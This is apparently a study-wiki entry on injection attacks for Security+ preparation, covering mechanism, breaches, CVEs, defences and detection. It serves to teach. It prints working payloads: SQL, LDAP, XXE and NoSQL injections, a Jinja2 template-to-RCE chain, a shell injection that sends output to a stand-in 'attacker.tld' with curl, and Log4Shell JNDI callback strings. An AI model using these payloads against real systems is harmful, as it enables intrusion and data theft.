```markdown
---
domain: "offensive-security"
tags: [injection, owasp, web-security, sqli, application-security, attack]
---
# Injection

**Injection** is a class of attacks in which an adversary supplies untrusted input that an application passes, unvalidated, to an **interpreter** — a SQL engine, OS shell, LDAP directory, XML parser, or template engine — where it is executed as code or commands rather than treated as data. Injection flaws arise whenever the boundary between **code and data** is blurred, and they remain one of the most impactful vulnerability classes catalogued by the [[OWASP Top 10]], enabling outcomes that range from credential theft to full [[Remote Code Execution]]. Every incarnation of the attack shares a single root cause: the application builds a syntactic structure by concatenating attacker-controlled strings rather than binding data as inert parameters.

---

## Overview

Injection vulnerabilities are the canonical example of a **confused deputy** problem: a privileged component (the interpreter) receives a mixed string of trusted template logic and untrusted user input, and has no reliable way to distinguish which bytes were intended as literal values versus syntactic tokens. If an attacker can smuggle a metacharacter — a single quote, semicolon, backtick, null byte, angle bracket, or reserved keyword — into a context where the interpreter treats it as structure, the attacker effectively rewrites the program at runtime. This pattern recurs across every domain that mixes code and data: databases, operating system shells, directory services, XML processors, HTTP headers, log pipelines, serialization libraries, and increasingly large-language-model prompt chains ([[Prompt Injection]]).

The archetype is **[[SQL Injection]]**, first formally documented by Jeff Forristal (rain.forest.puppy) in *Phrack* issue 54 in 1998. Yet two decades later, injection still occupies a top position in the OWASP Top 10 — ranked #1 from 2010 through 2017 before being consolidated into the broader *A03:2021 Injection* category, which also absorbed Cross-Site Scripting. OWASP researchers consistently find injection flaws in roughly 94 % of applications they examine, with an average of 3.37 distinct instances per vulnerable application.

Real-world impact is severe and well-documented. The **Heartland Payment Systems** breach (2008) exposed 134 million payment card numbers via SQL injection in a web form, costing the company over $140 million in settlements and remediation. **TalkTalk** (2015) lost 157,000 customer records and £77 million in fines and recovery costs to a trivially exploitable SQLi run by teenagers. **Sony Pictures** (2011, the LulzSec campaign) and **Yahoo Voices** (2012, 450,000 plaintext credentials leaked publicly) were both rooted in SQL injection. On the command-injection side, **Shellshock** (CVE-2014-6271) was a parsing injection in Bash's function export mechanism that affected CGI servers worldwide, and **Log4Shell** (CVE-2021-44228) was a JNDI-lookup injection in the Apache Log4j 2 library that granted unauthenticated remote code execution on hundreds of millions of Java-based services and is widely considered one of the most catastrophic vulnerabilities of the 21st century.

Injection persists because it is a **systemic design failure**, not an isolated bug. As long as developers build queries or commands by string concatenation — whether in COBOL, PHP, Python, Go, or a React server component — every new interpreter surface will spawn new injection opportunities. Modern frameworks reduce the common cases through parameterization and safe-by-default APIs, but novel interpreter ecosystems (NoSQL query DSLs, GraphQL resolvers, server-side template engines, prompt-driven LLMs) regularly reintroduce the same anti-pattern in unfamiliar disguises.

---

## How It Works

All injection attacks follow the same three-stage mechanism regardless of interpreter: **identify a sink**, **break out of the data context**, and **append attacker-controlled syntax** that the interpreter will execute.

### Stage 1 — Sink Identification

The attacker enumerates every input channel that might reach an interpreter: URL parameters, POST body fields, HTTP headers (`User-Agent`, `X-Forwarded-For`, `Referer`), cookies, uploaded filenames, JSON or XML payloads, and GraphQL variables. Injecting a single out-of-grammar character — a single quote `'`, a semicolon `;`, a backtick `` ` ``, or an asterisk `*` — and observing whether the application returns a database error, a shell traceback, an LDAP exception, or a measurable timing delay reveals the interpreter type.

### Stage 2 — Context Escape

The attacker supplies the metacharacter that terminates the enclosing literal in the target grammar. For a SQL string built as:

```sql
WHERE username = '$input'
```

the payload `admin'--` closes the string literal with `'`, comments out the remainder with `--`, and causes the query to authenticate unconditionally.

### Stage 3 — Payload Execution

With structural control established, the attacker appends whatever the interpreter supports:

| Interpreter | Payload class | Typical outcome |
|---|---|---|
| SQL | `UNION SELECT`, stacked queries | Data exfiltration, schema enumeration, OS command execution |
| OS shell | `;`, `&&`, `\|`, `` ` `` | RCE, reverse shell |
| LDAP | `*`, `)(uid=*)` | Authentication bypass, directory enumeration |
| XML/XXE | `<!ENTITY xxe SYSTEM "file:///...">` | Local file read, SSRF |
| Template (SSTI) | `{{ 7*7 }}`, `${7*7}` | RCE via reflection APIs |
| NoSQL (MongoDB) | `{"$ne": null}` | Auth bypass, logical query manipulation |
| JNDI/Log4j | `${jndi:ldap://...}` | Unauthenticated RCE via LDAP callback |

---

### Code Examples by Interpreter

**SQL Injection — classic UNION exfiltration (MySQL)**
```sql
-- Vulnerable application code:
-- "SELECT title, body FROM posts WHERE id = " + request.GET['id']

GET /post?id=-1 UNION SELECT username,password_hash FROM users--
```

**SQL Injection — time-based blind (PostgreSQL)**
```sql
'; SELECT CASE WHEN (SELECT current_user)='postgres'
          THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

**SQL Injection — error-based (MySQL)**
```sql
' AND extractvalue(1,concat(0x7e,(SELECT version())))--
```

**OS Command Injection (Linux)**
```bash
# Vulnerable Python:  os.system("ping -c 1 " + host)

# Payload variants:
host=8.8.8.8;cat /etc/passwd
host=8.8.8.8 && curl http://attacker.tld/$(whoami)
host=`id`
```

**LDAP Injection — authentication bypass**
```
# Vulnerable filter:  (&(uid=$user)(password=$pass))
# Payload:
user=*)(uid=*))(|(uid=*
pass=anything
# Resulting filter: (&(uid=*)(uid=*))(|(uid=*)(password=anything))
# Evaluates to TRUE for any user
```

**XML External Entity (XXE)**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<userProfile><name>&xxe;</name></userProfile>
```

**Server-Side Template Injection — Jinja2 (Python) to RCE**
```python
# Payload in a "name" field rendered as {{ name }}
{{ ''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].decode() }}
```

**NoSQL Injection — MongoDB**
```json
POST /login
{"username": "admin", "password": {"$ne": null}}
```

**Log4Shell — JNDI lookup injection (CVE-2021-44228)**
```
User-Agent: ${jndi:ldap://attacker.tld:1389/exploit}
X-Api-Version: ${jndi:ldap://attacker.tld:1389/a}
```

---

### Relevant Ports and Protocols

- **TCP 80 / 443** — HTTP/S: primary entry point for nearly all web-facing injection
- **TCP 1433** — Microsoft SQL Server
- **TCP 3306** — MySQL / MariaDB
- **TCP 5432** — PostgreSQL
- **TCP 1521** — Oracle DB
- **TCP 389 / 636** — LDAP / LDAPS
- **TCP 1389** — Common attacker-controlled LDAP callback server (Log4Shell)
- **TCP 4444 / 9001 / 443** — Common reverse shell listener ports after successful RCE

---

## Key Concepts

- **Interpreter / Sink** — The privileged component that parses and executes the composed string. Every injection subclass is named for its interpreter: SQL, OS shell, LDAP, XPath, SMTP header, XML, template, NoSQL, JNDI. Identifying the sink is the first step in both attack and defense.
- **Parameterization / Prepared Statements** — The canonical defence. A parameterized query separates the query *skeleton* from the *data values* so the interpreter never reparses user-supplied bytes as syntax. `cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))` is safe; `"SELECT * FROM users WHERE id = " + user_id` is not.
- **In-Band, Blind, and Out-of-Band Injection** — In-band SQLi returns results directly in the HTTP response (error-based or UNION-based). Blind SQLi requires inference: boolean-based (response differs for true/false conditions) or time-based (response latency reveals data one bit at a time). Out-of-band (OOB) exfiltrates via a secondary channel such as DNS lookups or HTTP callbacks, used when the application produces no detectable in-response differences.
- **Second-Order Injection** — A payload stored harmlessly at write time (because the insertion is parameterized) but then later concatenated into a new query when retrieved by a different code path. Input validation at the boundary alone does not prevent this; all query construction must be parameterized.
- **Stacked Queries** — Injecting a statement terminator (`;`) to append an entirely new statement: `1; DROP TABLE users--`. Supported by MSSQL and PostgreSQL; MySQL's default PHP `mysql_query()` driver historically rejected them, but `PDO` and `mysqli` can permit them.
- **Metacharacter / Grammar Escape** — Any character that holds special meaning in the target grammar and can break out of a literal context: `'` and `"` in SQL strings, `;` and `|` in shells, `*` and `)` in LDAP, `<`, `>`, `&` in XML, `{`, `}`, `$` in templates.
- **Canonicalization and Encoding Bypass** — Evading blacklist filters by representing payloads in alternate encodings: URL encoding (`%27` for `'`), double URL encoding (`%2527`), Unicode homoglyphs, hex literals (`0x61646d696e`), alternate comment styles (`/**/` instead of `--`), or mixed case (`SeLeCt`). Allowlist validation on decoded, canonicalized input defeats most of these.

---

## Exam Relevance

Security+ SY0-701 addresses injection under **Domain 2.4** (Analyze indicators of malicious activity) and **Domain 4.1** (Apply common security techniques to computing resources / application hardening). Key exam patterns:

- **Recognize injection from a payload description.** A login field that returns "Welcome, admin!" when given `' OR '1'='1'--` is SQL injection — not XSS, not CSRF, not a buffer overflow. If the payload contains `<script>` tags, it is [[Cross-Site Scripting]] (a subclass of injection in OWASP's taxonomy but treated as its own topic on the exam).
- **Primary mitigation = parameterized queries.** For any question asking what *best* mitigates SQL injection, the correct answer is **parameterized queries / prepared statements**. Input validation, stored procedures, and WAFs appear as supporting controls but are not the primary fix.
- **Injection vs. XSS distinction.** The exam distinguishes SQLi (server-side database interpreter) from XSS (client-side browser interpreter). Payloads with `UNION SELECT`, `--`, or `sleep()` → SQLi. Payloads with `<script>alert()` → XSS. Both fall under OWASP's injection umbrella but are separate exam objectives.
- **Know Log4Shell as injection, not overflow or supply-chain.** CVE-2021-44228 appears in exam scenarios as an example of injection via untrusted data in a log message triggering a JNDI lookup. The mechanism is injection; the vector is a logging library.
- **Command injection keywords.** Scenarios describing a web form that "pings" a user-supplied host and returning unexpected OS output signal command injection. The fix is to avoid shell execution entirely, or use an argv-array API (`shell=False` equivalent).
- **LDAP injection gotcha.** Authentication-bypass via crafted directory queries is LDAP injection, not SQL injection — both use similar metacharacters but target different interpreters and have different mitigations (LDAP: filter escaping via RFC 4515; SQL: parameterized queries).

---

## Security Implications

The blast radius of a successful injection attack depends on the interpreter and its privilege level, but the worst-case outcome is always full host compromise.

**Database impact:** At minimum, SQLi yields unauthorized data reads (credential hashes, PII, financial records). Write access allows `UPDATE` and `DELETE` against any accessible table. On Microsoft SQL Server with `xp_cmdshell` enabled, SQLi becomes instant OS command execution. PostgreSQL 9.3+ allows `COPY FROM PROGRAM`. MySQL allows `SELECT … INTO OUTFILE` to write webshells if `FILE` privilege is granted and the web root is writable.

**OS-level impact:** Command injection is immediate RCE. The attacker can exfiltrate `/etc/passwd`, `/etc/shadow`, and SSH private keys; establish reverse shells; deploy persistent backdoors via cron or systemd units; and pivot to internal network segments unreachable from the internet.

**Notable CVEs:**

| CVE | Product | Injection type | CVSS | Impact |
|---|---|---|---|---|
| CVE-2021-44228 | Apache Log4j 2.x | JNDI lookup | 10.0 | Unauthenticated RCE, affected billions of instances |
| CVE-2017-5638 | Apache Struts 2 | OGNL expression (Content-Type) | 10.0 | RCE; root cause of the Equifax breach (147M records) |
| CVE-2014-6271 | GNU Bash (Shellshock) | Function-definition env var | 10.0 | RCE via CGI, DHCP, ForceCommand |
| CVE-2019-19781 | Citrix ADC / Gateway | Path traversal + template injection | 9.8 | Unauthenticated RCE on ~80,000 gateways |
| CVE-2022-22965 | Spring Framework (Spring4Shell) | Data-binding property injection | 9.8 | RCE on Tomcat deployments |
| CVE-2012-2122 | MySQL / MariaDB | Auth bypass (memcmp timing) | 5.1 | Login bypass without injection but same input-trust class |

**Detection signals:**

- Web access logs containing `UNION`, `SELECT`, `sleep(`, `WAITFOR`, `%27` (URL-encoded `'`), `%20OR%20`, `AND 1=1`, `AND 1=2`
- Spike in HTTP 500 responses from a single IP or parameter
- Anomalously long response times (time-based blind SQLi may cause 5–30 second pauses)
- Outbound DNS queries or HTTP callbacks from application servers to attacker-controlled domains (OOB injection, Log4Shell)